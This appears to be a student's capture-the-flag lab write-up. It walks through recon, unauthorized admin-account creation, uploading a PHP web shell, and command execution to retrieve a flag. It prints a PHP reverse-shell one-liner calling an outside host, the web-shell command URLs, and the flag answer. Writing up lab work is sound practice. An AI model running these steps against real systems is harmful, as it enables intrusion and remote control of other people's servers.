# VA-
lab week 3
## **1. Reconnaissance (Information Gathering)**

**Objective:** Identify target surface and exposed services.

Always start with nmap to scan for open port and services.

```nmap -sC -sV -Pn -vv 10.150.150.11```
<img width="1388" height="762" alt="Screenshot 2026-04-14 222736" src="https://github.com/user-attachments/assets/95061803-80e7-4699-8bf5-87d71d6f9681" />
<img width="1273" height="813" alt="Screenshot 2026-04-14 222827" src="https://github.com/user-attachments/assets/6a00bc39-4926-4e7e-a4b3-0c147aa58075" />
<img width="1378" height="810" alt="Screenshot 2026-04-14 222914" src="https://github.com/user-attachments/assets/58a955b4-f1af-4f16-8f4d-d889179fd221" />
<img width="833" height="142" alt="Screenshot 2026-04-14 222949" src="https://github.com/user-attachments/assets/0657e4f7-ea82-4e71-9833-c69b27f73d50" />



## **2. Scanning & Enumeration**

**Objective:** Extract deeper information from identified services.

### Web Enumeration

**Gobuster**

```
 gobuster dir -u [http://10.150.150.11](http://10.150.150.11/) -w /usr/share/wordlists/dirb/common.txt
```

<img width="790" height="636" alt="Screenshot 2026-04-14 224856" src="https://github.com/user-attachments/assets/316e6ebe-0b42-4671-9541-0a3fbd6adec1" />

### Discovered:

- `/upload`
- `/admin`

`/upload`
<img width="953" height="434" alt="Screenshot 2026-04-14 225141" src="https://github.com/user-attachments/assets/fbc117a3-793a-4a9c-869c-2c24f393ec42" />

`/admin`
<img width="954" height="354" alt="image" src="https://github.com/user-attachments/assets/6573522e-d392-4222-85e2-f351c641623e" />

```latex
http://10.150.150.11/admin/addedituser.php
```

<img width="952" height="592" alt="image" src="https://github.com/user-attachments/assets/001d5817-b9fe-4e95-9883-54cf38a6b1aa" />

### Findings:

- `/upload` → directory indexing enabled
- `/admin/addedituser.php` → user management exposed

## **3. Gaining Access (Exploitation)**

**Objective:** Exploit vulnerabilities to gain initial foothold.

### Vulnerability Identified:

- **Improper Access Control**
- Ability to:
    - Access admin panel
    - Create new users
    - Assign admin role (Full administrative access to web panel)

So i add **testuser:testuser** with **role:admin**

We can also view a list of user.
<img width="953" height="653" alt="Screenshot 2026-04-14 225947" src="https://github.com/user-attachments/assets/5242cdb6-640f-4159-8b52-67ec731eb197" />

### Next Exploit: File Upload Vulnerability

- Upload functionality available
- No validation on file type

➡️ Uploaded malicious PHP file (web shell attempt)

Then i found that i can add a file. So lets try to upload the reverse shell.

[Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Lets refer to [Pentestmonkey](https://pentestmonkey.net/) for Reverse Shell.

```
php -r '$sock=fsockopen("10.0.02.15",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
<img width="953" height="446" alt="image" src="https://github.com/user-attachments/assets/4821c534-135f-44c6-a431-1c150bf6b93c" />

<img width="956" height="288" alt="image" src="https://github.com/user-attachments/assets/c53b8890-1a94-435e-aaaf-68bde10d1535" />

Nothing happen.

Lets try Command Injection via web shell
```
?cmd=whoami
```
<img width="957" height="201" alt="image" src="https://github.com/user-attachments/assets/23d506c1-6cb8-4639-bbf6-451d45f3f540" />
✅ Successful execution confirmed RCE

## **4. Maintaining Access (Post-Exploitation)**

**Objective:** Establish control and explore system.

```
?cmd=hostname
```
<img width="929" height="158" alt="image" src="https://github.com/user-attachments/assets/d402b6aa-9f7f-44f1-a78c-cf6523f646ec" />

```
?cmd=net user
```
<img width="948" height="218" alt="image" src="https://github.com/user-attachments/assets/95366a4a-cb0d-4780-a458-2915116ca418" />

## 5. Privilege Escalation & Lateral Movement

**Objective:** Gain higher privileges / sensitive access.
```
?cmd=dir C:\Users
```
<img width="952" height="307" alt="image" src="https://github.com/user-attachments/assets/5a9f965d-011c-4605-8b0b-eba33be7309c" />

```
?cmd=dir C:\Users\Administrator\
```
<img width="951" height="421" alt="image" src="https://github.com/user-attachments/assets/76b45d3c-84fa-4536-91fb-15af4e4650e3" />
```
?cmd=dir C:\Users\Administrator\Desktop
```
<img width="948" height="289" alt="image" src="https://github.com/user-attachments/assets/1c4407de-98ec-4a20-afb5-cb4c942a7d07" />

THERE IT IS FLAG1!!

### Result:

- Found sensitive file:
    - `FLAG1.txt`

```
http://10.150.150.11/upload/11/cmd.php?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt
```

> **FLAG1**: PwnTillDawnAcademyIsAwesome!!!
